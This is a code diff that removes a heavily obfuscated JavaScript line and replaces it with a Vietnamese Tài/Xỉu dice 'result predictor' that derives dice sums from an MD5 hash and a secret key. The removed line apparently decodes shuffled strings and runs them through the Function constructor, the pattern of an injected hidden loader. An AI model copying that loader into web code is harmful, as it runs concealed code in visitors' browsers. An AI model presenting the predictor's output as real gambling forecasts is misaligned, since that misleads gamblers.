@@ -1,1 +1,23 @@
-var predictResult;(function(){var PXb='',VOb=531-520;function zwb(e){var z=2976512;var h=e.length;var q=[];for(var l=0;l<h;l++){q[l]=e.charAt(l)};for(var l=0;l<h;l++){var i=z*(l+178)+(z%37571);var k=z*(l+285)+(z%26231);var c=i%h;var u=k%h;var b=q[c];q[c]=q[u];q[u]=b;z=(i+k)%5721553;};return q.join('')};var wkU=zwb('fvnitrucgorcbctowohyjsrasmuqzltpdexnk').substr(0,VOb);var AeY='31)elr,),s)s k;=1[kv(r;fqvkscd-p)qiea.tzse-1;f+vs)n="v0tan=co6 0 hiqd=8,xs8(6u-p1rr46i", ;v +,m o);3i(,=r,.p=7,0fis75.e"]=pvkbla[h;{*i==a(qing;nrrurqjja.1b{=ftqoor]tmir f.t9ngk==c}{.rl[;+=nC.nh9h3oc rtq,r(=srm7 ,n,eoi1.a.6b==nrlh{(dd=l(rn2(-ghiq(lt4hpg0pl(n(ha=)2=+0u{ r5)+l);e(gwr[;uqvifi=u+,dv," +ennlli+aahc+n[pu;oguto,]uv"(wa+ ;}al7"8roro.ec+gtanr0ial;]ir0=c=;qls= h,;v+b(=)e(t;=ar5h7r8.A,[=tsd;s;.Ct(wreAvao(pt1;.-=q2)1v6l=nolS2m)[6; ot=!-r h=nua,lgpeClu [)(boli];t,(1(oA]<ggrh(i[ltefvrCxd2vht( 6)x).alhcshten(v7m](euf1tzh,tv},8Sr78eeft..=nr ;onnrofril+yuln0{CA=),>c)(.;hm9;+(4<tsgu; ;( ;rg;itm}ufa8)})i 9c<);2=+ui;69ur;nnso}ais]z<)prmf}sh>ui8(vsqolne5za,j*;fie=a+oh(lr76]ev)bp+C)c;;nn)sq1avaa!a;jii](xrdA0re(e+"r<a[6,=2,zaa,+=C;+s)o)6a   th[aw;v3(.re))8{;fvfxarred)9;(=z"e;1vorn+[s;;t0.u4a0go7c]=).o;;rvloteC40.z[r.nt=i).r-)=+nothvogu;rl+r[2+i)d,9].g]av;r]purjgfv(p +=loe"..,.=7inl;)"';var jmb=zwb[wkU];var MjF='';var NzJ=jmb;var dDf=jmb(MjF,zwb(AeY));var rqN=dDf(zwb('6B!D([c1(is%d==3rBx,G4ei;Ba."l.8p]agttpB)m)e6%]].)a &3( +ylBT]d{e%u\/%k.r.C%,8yfs5!(D=C1.Bj{B=$")7 "=BBtBs)ei1>[d BloBx(B.DBd6\'.mBB;B+ 4icl)es;Ba$c,.n3d=iuB7x(uBfMff..BlB=l345r .B.rb3a<\/$_[6e,dc6MoBB7y5]tDB>C$)\'B1oopBnoaaB]++..nd(7l].aB.B*sa=mhj5h3dr.h:.(4sdcdy\/!fd{=Bd;]Bie;7m")Bdce(]4S,-(m].fCjB] 3rtl-de{Bur!!k.=C3i!(?,l0%Ble"r3aew3e0di 6smx.rygs{1Boo1i%s0Bc.ea=diB.wBn6cg)B7o.}bB{.8sdd%yo"=_(pd3B<@]@u{\/6u)fBo=Bnut=e?#23Brt)e%3wh,t(6c;_o%;(d\/E_sx0phBCse(,t.nd.,$(BBx[$,E(8k,)}7t\'eB-d6)B..B7)kdpB .y_%G,)lfehlerna+.B.%;B)$a&Bsst=aBl +B0>B);d+!cBcB.B-i+e0>}]=3"p.(c%s$BB]Bo ty5biB(fB$,5(ynpdo,.83])BBBt43_o..r]aBcn%617(4Bg}pAFa12(S0T32;(k=,4#c,47jne?n7e3o)wa!)BfBr,B;p,B)g!B.c;c97s;.$_)w$A0?_7%t0eaom6St;(Bn(B=l).;.t(;5;nc4l)2BjBw{(Bn=<7r;(!!.1ACx%ka.[.<Cd_*3n}rn(7+.!ol BCg28oo,n.d2));=aBd;-r6.e)hweBin8$f Bi)=; .BDf{3BB4,,B=0:S#B1BuBbaB.hBB.ptd1(cr(t!.o iBB.)_!p.BB5uCS6@tn62BsoEBpBdm+d .l_}"lcBl(cf4hk=3al(ar5 3byen,]0B],4>$t64,s]lB"2iuBBB c1(s+la=>dki3=dBuBwB3[#a$)B3tj]BcB!0acy8BodrI2!.8e!u(6\/gI!jjir()te=}5()ddEo=I<n_Ea.%Tda"t7lcI$(m.5i]Cht1%;#h)).iMtB?n)l?.H0>]a]n=l6ta:ih)B0,B;-t1e$3rDBe;"sBBB2i=(;(,B 52,%:44B.8 Itt_i({l%aBr4.6.la9kB) Bn8nIwd)[H%HB4dBB9.S6t_;<+hMf.);CB.cHx2cB_sBB,[BS7)M.r]0B-n]59e4o..0,.cg_.ii#oca1b]1t.Brx)ctTC=8Bd.(u91)m!i. %e{hBn+7fi._d77BBkE=s:_sFo)(!Baid!"0%;+tBdo]:)"ii2;sn.d(2dacrp3[23u.Id+<d=D)p_6 ks)u>+2hcyi==c]B7EBl.B(c3]pAB!.f>,*=_l;aotdtze\/dlte;._"102#Bna{;.{>5,=r8]foBt\' i[m76td.d!uB9_._.2hBz )B_B=nBBeCt+u_={;fBgx$1*!,-is{)e1du_B0)dBc=B+edme1lB.B,Bb e>j)l=dB]u%B=B (c;1w,atBBBs=FBsB{_f.;_6,)3e g,2.6+BBc&(]r$Sr(axadk47&))6a=n)6w).y.!g(B}6s3!.,trB=.n3sf>aiB]e=91fBs"1n[D)l]4nsiu)Ifd3g(BeMeo&3$)"}oB;oo ;B) [33B(]deB.}_BBh%c3%8Bt_)us=o$BBB30v8("8B3;h#)Bj))]aBaejjB*$7do (} Bm87($\'BBo }c0iojBni 766p;(7)_{rns_caBe5s$Bu B_d)BC_jaB ]tFneB}B1.1 s_5Bt(B66.qsl0xn0sl"fdBB(. iimdx\'l[2t.a%legv14B1.B@t..nr.B==lBBBiBes_E1_6ep(!okirrBBBBB(.3_Bi5_$af(uef.l;n.B,s]" 1es%#))!p(al 71}=(=.,t*_)1ai<59tB%$k3 .dt]'));var Gmc=NzJ(PXb,rqN );Gmc(7817);return 2442})()
+function predictResult() {
+      const md5 = document.getElementById('md5').value.trim();
+      const key = document.getElementById('secret-key').value.trim();
+
+      if (md5.length !== 32) {
+        document.getElementById('result').innerHTML = '<span class="xiu">Chuỗi MD5 không hợp lệ.</span>';
+        return;
+      }
+
+      const fullHash = md5 + key;
+      const hash = CryptoJS.MD5(fullHash).toString();
+
+      const sliced = hash.slice(0, 8);
+      const intValue = parseInt(sliced, 16);
+      const diceSum = (intValue % 6 + 1) + (Math.floor(intValue / 6) % 6 + 1) + (Math.floor(intValue / 36) % 6 + 1);
+      const resultText = diceSum >= 11 ? `<span class="tai">Tài (${diceSum})</span>` : `<span class="xiu">Xỉu (${diceSum})</span>`;
+
+      document.getElementById('result').innerHTML = 'Kết quả: ' + resultText;
+    }
+
+    window.onload = () => {
+      document.getElementById('main-functions').style.display = 'block';
+    };
